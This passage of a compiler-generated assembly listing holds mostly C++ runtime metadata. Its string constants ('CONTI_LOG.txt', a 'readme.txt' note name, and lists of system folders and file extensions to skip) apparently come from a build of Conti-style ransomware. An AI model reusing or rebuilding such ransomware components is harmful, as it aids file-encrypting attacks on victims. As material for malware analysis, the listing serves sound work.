pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Convert_size@_K_K@std@@YA_K_K@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Convert_size@_K_K@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN5
	DD	imagerel $LN5+522
	DD	imagerel $unwind$??$_Construct@$00PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z DD imagerel $LN5
	DD	imagerel $LN5+455
	DD	imagerel $unwind$??$_Construct@$01PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXQEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z DD imagerel $LN3
	DD	imagerel $LN3+124
	DD	imagerel $unwind$??R<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W10@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z DD imagerel $LN6
	DD	imagerel $LN6+390
	DD	imagerel $unwind$??$_Reallocate_for@V<lambda_1>@?1??assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??assign@01@QEAAAEAV01@QEB_W0@Z@PEB_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$addressof@V?$_String_val@U?$_Simple_types@_W@std@@@std@@@std@@YAPEAV?$_String_val@U?$_Simple_types@_W@std@@@0@AEAV10@@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z DD imagerel $LN3
	DD	imagerel $LN3+98
	DD	imagerel $unwind$??$_Construct_in_place@PEA_WAEAPEA_W@std@@YAXAEAPEA_W0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$_Unfancy@_W@std@@YAPEA_WPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+41
	DD	imagerel $unwind$??$_Destroy_in_place@PEA_W@std@@YAXAEAPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$max@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$max@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z DD imagerel $LN4
	DD	imagerel $LN4+97
	DD	imagerel $unwind$??$_Deallocate@$0BA@$0A@@std@@YAXPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$min@_K@std@@YAAEB_KAEB_K0@Z DD imagerel $LN5
	DD	imagerel $LN5+119
	DD	imagerel $unwind$??$min@_K@std@@YAAEB_KAEB_K0@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+119
	DD	imagerel $unwind$??$_Allocate_for_capacity@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAPEA_WAEAV?$allocator@_W@1@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+98
	DD	imagerel $unwind$??$_Construct_in_place@PEA_WAEBQEA_W@std@@YAXAEAPEA_WAEBQEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z DD imagerel $LN3
	DD	imagerel $LN3+48
	DD	imagerel $unwind$??$addressof@PEA_W@std@@YAPEAPEA_WAEAPEA_W@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z DD imagerel $LN3
	DD	imagerel $LN3+177
	DD	imagerel $unwind$??R<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV23@QEB_W_K@Z@QEBA@QEA_W0101@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD imagerel $LN6
	DD	imagerel $LN6+546
	DD	imagerel $unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD imagerel $LN3
	DD	imagerel $LN3+68
	DD	imagerel $unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD imagerel $LN5
	DD	imagerel $LN5+94
	DD	imagerel $unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD imagerel $LN4
	DD	imagerel $LN4+93
	DD	imagerel $unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD imagerel $LN12
	DD	imagerel $LN12+154
	DD	imagerel $unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z
pdata	ENDS
;	COMDAT rtc$TMZ
rtc$TMZ	SEGMENT
_RTC_Shutdown.rtc$TMZ DQ FLAT:_RTC_Shutdown
rtc$TMZ	ENDS
;	COMDAT rtc$IMZ
rtc$IMZ	SEGMENT
_RTC_InitBase.rtc$IMZ DQ FLAT:_RTC_InitBase
rtc$IMZ	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_array_new_length@std@@8 DD imagerel ??_R0?AVbad_array_new_length@std@@@8 ; std::bad_array_new_length::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	02H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R2bad_array_new_length@std@@8 DD imagerel ??_R1A@?0A@EA@bad_array_new_length@std@@8 ; std::bad_array_new_length::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@bad_alloc@std@@8
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_array_new_length@std@@8
rdata$r	SEGMENT
??_R3bad_array_new_length@std@@8 DD 00H			; std::bad_array_new_length::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	03H
	DD	imagerel ??_R2bad_array_new_length@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_array_new_length@std@@6B@
rdata$r	SEGMENT
??_R4bad_array_new_length@std@@6B@ DD 01H		; std::bad_array_new_length::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	imagerel ??_R3bad_array_new_length@std@@8
	DD	imagerel ??_R4bad_array_new_length@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@bad_alloc@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@bad_alloc@std@@8 DD imagerel ??_R0?AVbad_alloc@std@@@8 ; std::bad_alloc::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	01H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R2bad_alloc@std@@8
rdata$r	SEGMENT
??_R2bad_alloc@std@@8 DD imagerel ??_R1A@?0A@EA@bad_alloc@std@@8 ; std::bad_alloc::`RTTI Base Class Array'
	DD	imagerel ??_R1A@?0A@EA@exception@std@@8
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3bad_alloc@std@@8
rdata$r	SEGMENT
??_R3bad_alloc@std@@8 DD 00H				; std::bad_alloc::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	02H
	DD	imagerel ??_R2bad_alloc@std@@8
rdata$r	ENDS
;	COMDAT ??_R4bad_alloc@std@@6B@
rdata$r	SEGMENT
??_R4bad_alloc@std@@6B@ DD 01H				; std::bad_alloc::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	imagerel ??_R3bad_alloc@std@@8
	DD	imagerel ??_R4bad_alloc@std@@6B@
rdata$r	ENDS
;	COMDAT ??_R1A@?0A@EA@exception@std@@8
rdata$r	SEGMENT
??_R1A@?0A@EA@exception@std@@8 DD imagerel ??_R0?AVexception@std@@@8 ; std::exception::`RTTI Base Class Descriptor at (0,-1,0,64)'
	DD	00H
	DD	00H
	DD	0ffffffffH
	DD	00H
	DD	040H
	DD	imagerel ??_R3exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R2exception@std@@8
rdata$r	SEGMENT
??_R2exception@std@@8 DD imagerel ??_R1A@?0A@EA@exception@std@@8 ; std::exception::`RTTI Base Class Array'
	ORG $+3
rdata$r	ENDS
;	COMDAT ??_R3exception@std@@8
rdata$r	SEGMENT
??_R3exception@std@@8 DD 00H				; std::exception::`RTTI Class Hierarchy Descriptor'
	DD	00H
	DD	01H
	DD	imagerel ??_R2exception@std@@8
rdata$r	ENDS
;	COMDAT ??_R4exception@std@@6B@
rdata$r	SEGMENT
??_R4exception@std@@6B@ DD 01H				; std::exception::`RTTI Complete Object Locator'
	DD	00H
	DD	00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	imagerel ??_R3exception@std@@8
	DD	imagerel ??_R4exception@std@@6B@
rdata$r	ENDS
;	COMDAT ??_C@_15DDHGOCBH@?$AA?4?$AA?4@
CONST	SEGMENT
??_C@_15DDHGOCBH@?$AA?4?$AA?4@ DB '.', 00H, '.', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_13JOFGPIOO@?$AA?4@
CONST	SEGMENT
??_C@_13JOFGPIOO@?$AA?4@ DB '.', 00H, 00H, 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_1HC@LEGLMILJ@?$AAF?$AAi?$AAn?$AAd?$AAF?$AAi?$AAr?$AAs?$AAt?$AAF?$AAi?$AAl?$AAe?$AA?5?$AAf@
CONST	SEGMENT
??_C@_1HC@LEGLMILJ@?$AAF?$AAi?$AAn?$AAd?$AAF?$AAi?$AAr?$AAs?$AAt?$AAF?$AAi?$AAl?$AAe?$AA?5?$AAf@ DB 'F'
	DB	00H, 'i', 00H, 'n', 00H, 'd', 00H, 'F', 00H, 'i', 00H, 'r', 00H
	DB	's', 00H, 't', 00H, 'F', 00H, 'i', 00H, 'l', 00H, 'e', 00H, ' '
	DB	00H, 'f', 00H, 'a', 00H, 'i', 00H, 'l', 00H, 's', 00H, ' ', 00H
	DB	'i', 00H, 'n', 00H, ' ', 00H, 'd', 00H, 'i', 00H, 'r', 00H, 'e'
	DB	00H, 'c', 00H, 't', 00H, 'o', 00H, 'r', 00H, 'y', 00H, ' ', 00H
	DB	'%', 00H, 's', 00H, '.', 00H, ' ', 00H, 'G', 00H, 'e', 00H, 't'
	DB	00H, 'L', 00H, 'a', 00H, 's', 00H, 't', 00H, 'E', 00H, 'r', 00H
	DB	'r', 00H, 'o', 00H, 'r', 00H, ' ', 00H, '=', 00H, ' ', 00H, '%'
	DB	00H, 'l', 00H, 'u', 00H, '.', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19PINKOIBI@?$AA?4?$AAb?$AAa?$AAt@
CONST	SEGMENT
??_C@_19PINKOIBI@?$AA?4?$AAb?$AAa?$AAt@ DB '.', 00H, 'b', 00H, 'a', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BM@CNNHHOMD@?$AAC?$AAO?$AAN?$AAT?$AAI?$AA_?$AAL?$AAO?$AAG?$AA?4?$AAt?$AAx?$AAt@
CONST	SEGMENT
??_C@_1BM@CNNHHOMD@?$AAC?$AAO?$AAN?$AAT?$AAI?$AA_?$AAL?$AAO?$AAG?$AA?4?$AAt?$AAx?$AAt@ DB 'C'
	DB	00H, 'O', 00H, 'N', 00H, 'T', 00H, 'I', 00H, '_', 00H, 'L', 00H
	DB	'O', 00H, 'G', 00H, '.', 00H, 't', 00H, 'x', 00H, 't', 00H, 00H
	DB	00H						; `string'
CONST	ENDS
;	COMDAT ??_C@_1BG@ICLDBDGN@?$AAr?$AAe?$AAa?$AAd?$AAm?$AAe?$AA?4?$AAt?$AAx?$AAt@
CONST	SEGMENT
??_C@_1BG@ICLDBDGN@?$AAr?$AAe?$AAa?$AAd?$AAm?$AAe?$AA?4?$AAt?$AAx?$AAt@ DB 'r'
	DB	00H, 'e', 00H, 'a', 00H, 'd', 00H, 'm', 00H, 'e', 00H, '.', 00H
	DB	't', 00H, 'x', 00H, 't', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_19MNJHNGGG@?$AA?4?$AAm?$AAs?$AAi@
CONST	SEGMENT
??_C@_19MNJHNGGG@?$AA?4?$AAm?$AAs?$AAi@ DB '.', 00H, 'm', 00H, 's', 00H, 'i'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DKJJGBOC@?$AA?4?$AAs?$AAy?$AAs@
CONST	SEGMENT
??_C@_19DKJJGBOC@?$AA?4?$AAs?$AAy?$AAs@ DB '.', 00H, 's', 00H, 'y', 00H, 's'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BEHMAPDG@?$AA?4?$AAl?$AAn?$AAk@
CONST	SEGMENT
??_C@_19BEHMAPDG@?$AA?4?$AAl?$AAn?$AAk@ DB '.', 00H, 'l', 00H, 'n', 00H, 'k'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19BHIGINDB@?$AA?4?$AAd?$AAl?$AAl@
CONST	SEGMENT
??_C@_19BHIGINDB@?$AA?4?$AAd?$AAl?$AAl@ DB '.', 00H, 'd', 00H, 'l', 00H, 'l'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_19DOGDICKI@?$AA?4?$AAe?$AAx?$AAe@
CONST	SEGMENT
??_C@_19DOGDICKI@?$AA?4?$AAe?$AAx?$AAe@ DB '.', 00H, 'e', 00H, 'x', 00H, 'e'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1BC@HAJBCMBC@?$AAp?$AAe?$AAr?$AAf?$AAl?$AAo?$AAg?$AAs@
CONST	SEGMENT
??_C@_1BC@HAJBCMBC@?$AAp?$AAe?$AAr?$AAf?$AAl?$AAo?$AAg?$AAs@ DB 'p', 00H, 'e'
	DB	00H, 'r', 00H, 'f', 00H, 'l', 00H, 'o', 00H, 'g', 00H, 's', 00H
	DB	00H, 00H					; `string'
CONST	ENDS
;	COMDAT ??_C@_1BI@ILHACKKN@?$AAT?$AAr?$AAe?$AAn?$AAd?$AA?5?$AAM?$AAi?$AAc?$AAr?$AAo@
CONST	SEGMENT
??_C@_1BI@ILHACKKN@?$AAT?$AAr?$AAe?$AAn?$AAd?$AA?5?$AAM?$AAi?$AAc?$AAr?$AAo@ DB 'T'
	DB	00H, 'r', 00H, 'e', 00H, 'n', 00H, 'd', 00H, ' ', 00H, 'M', 00H
	DB	'i', 00H, 'c', 00H, 'r', 00H, 'o', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BA@HLGGGPNC@?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs@
CONST	SEGMENT
??_C@_1BA@HLGGGPNC@?$AAW?$AAi?$AAn?$AAd?$AAo?$AAw?$AAs@ DB 'W', 00H, 'i', 00H
	DB	'n', 00H, 'd', 00H, 'o', 00H, 'w', 00H, 's', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_19JCAOHIEH@?$AAB?$AAo?$AAo?$AAt@
CONST	SEGMENT
??_C@_19JCAOHIEH@?$AAB?$AAo?$AAo?$AAt@ DB 'B', 00H, 'o', 00H, 'o', 00H, 't'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1DE@LIBHJBEH@?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA?5?$AAV?$AAo?$AAl?$AAu?$AAm?$AAe?$AA?5?$AAI@
CONST	SEGMENT
??_C@_1DE@LIBHJBEH@?$AAS?$AAy?$AAs?$AAt?$AAe?$AAm?$AA?5?$AAV?$AAo?$AAl?$AAu?$AAm?$AAe?$AA?5?$AAI@ DB 'S'
	DB	00H, 'y', 00H, 's', 00H, 't', 00H, 'e', 00H, 'm', 00H, ' ', 00H
	DB	'V', 00H, 'o', 00H, 'l', 00H, 'u', 00H, 'm', 00H, 'e', 00H, ' '
	DB	00H, 'I', 00H, 'n', 00H, 'f', 00H, 'o', 00H, 'r', 00H, 'm', 00H
	DB	'a', 00H, 't', 00H, 'i', 00H, 'o', 00H, 'n', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BK@KPOPEFAG@?$AA$?$AAR?$AAE?$AAC?$AAY?$AAC?$AAL?$AAE?$AA?4?$AAB?$AAI?$AAN@
CONST	SEGMENT
??_C@_1BK@KPOPEFAG@?$AA$?$AAR?$AAE?$AAC?$AAY?$AAC?$AAL?$AAE?$AA?4?$AAB?$AAI?$AAN@ DB '$'
	DB	00H, 'R', 00H, 'E', 00H, 'C', 00H, 'Y', 00H, 'C', 00H, 'L', 00H
	DB	'E', 00H, '.', 00H, 'B', 00H, 'I', 00H, 'N', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1BK@FDOENKL@?$AA$?$AAR?$AAe?$AAc?$AAy?$AAc?$AAl?$AAe?$AA?4?$AAB?$AAi?$AAn@
CONST	SEGMENT
??_C@_1BK@FDOENKL@?$AA$?$AAR?$AAe?$AAc?$AAy?$AAc?$AAl?$AAe?$AA?4?$AAB?$AAi?$AAn@ DB '$'
	DB	00H, 'R', 00H, 'e', 00H, 'c', 00H, 'y', 00H, 'c', 00H, 'l', 00H
	DB	'e', 00H, '.', 00H, 'B', 00H, 'i', 00H, 'n', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@KAKDHLGH@?$AAt?$AAh?$AAu?$AAm?$AAb@
CONST	SEGMENT
??_C@_1M@KAKDHLGH@?$AAt?$AAh?$AAu?$AAm?$AAb@ DB 't', 00H, 'h', 00H, 'u', 00H
	DB	'm', 00H, 'b', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_19KEIJKAKM@?$AAt?$AAe?$AAm?$AAp@
CONST	SEGMENT
??_C@_19KEIJKAKM@?$AAt?$AAe?$AAm?$AAp@ DB 't', 00H, 'e', 00H, 'm', 00H, 'p'
	DB	00H, 00H, 00H				; `string'
CONST	ENDS
;	COMDAT ??_C@_1M@OKMIJFDJ@?$AAw?$AAi?$AAn?$AAn?$AAt@
CONST	SEGMENT
??_C@_1M@OKMIJFDJ@?$AAw?$AAi?$AAn?$AAn?$AAt@ DB 'w', 00H, 'i', 00H, 'n', 00H
	DB	'n', 00H, 't', 00H, 00H, 00H			; `string'
CONST	ENDS
;	COMDAT ??_C@_17GNJCADOE@?$AAt?$AAm?$AAp@
CONST	SEGMENT
??_C@_17GNJCADOE@?$AAt?$AAm?$AAp@ DB 't', 00H, 'm', 00H, 'p', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_13FPGAJAPJ@?$AA?2@
CONST	SEGMENT
??_C@_13FPGAJAPJ@?$AA?2@ DB '\', 00H, 00H, 00H		; `string'
CONST	ENDS
;	COMDAT ??_C@_15PKPONJIK@?$AA?2?$AA?$CK@
CONST	SEGMENT
??_C@_15PKPONJIK@?$AA?2?$AA?$CK@ DB '\', 00H, '*', 00H, 00H, 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_13BBDEGPLJ@?$AA?$CK@
CONST	SEGMENT
??_C@_13BBDEGPLJ@?$AA?$CK@ DB '*', 00H, 00H, 00H	; `string'
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24 DD 010H
	DD	imagerel ??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_alloc@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DQ FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT _CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	imagerel _CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QEAA@AEBV01@@Z24
	DD	imagerel _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	ENDS
;	COMDAT _TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
_TI3?AVbad_array_new_length@std@@ DD 00H
	DD	imagerel ??1bad_array_new_length@std@@UEAA@XZ
	DD	00H
	DD	imagerel _CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT _CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24
xdata$x	SEGMENT
_CT??_R0?AVexception@std@@@8??0exception@std@@QEAA@AEBV01@@Z24 DD 00H
	DD	imagerel ??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	018H
	DD	imagerel ??0exception@std@@QEAA@AEBV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DQ FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DQ	0000000000000000H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DQ FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DQ	FLAT:??_Ebad_array_new_length@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DQ FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DQ	FLAT:??_Ebad_alloc@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DQ FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DQ	FLAT:??_Eexception@std@@UEAAPEAXI@Z
	DQ	FLAT:?what@exception@std@@UEBAPEBDXZ
CONST	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_manually_vector_aligned@U_Default_allocate_traits@std@@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	070070029H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Get_size_of_n@$01@std@@YA_K_K@Z DD 025051301H
	DD	010e2313H
	DD	070070025H
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate@$0BA@U_Default_allocate_traits@std@@$0A@@std@@YAPEAX_K@Z DD 025051301H
	DD	010e2313H
	DD	07007001dH
	DD	05006H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Allocate_at_least_helper@V?$allocator@_W@std@@@std@@YAPEA_WAEAV?$allocator@_W@0@AEA_K@Z DD 025051801H
	DD	01132318H
	DD	0700c001dH
	DD	0500bH
xdata	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	045H
	DW	0209H
voltbl	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z DD 035054c19H
	DD	011d3322H
	DD	070160043H
	DD	05015H
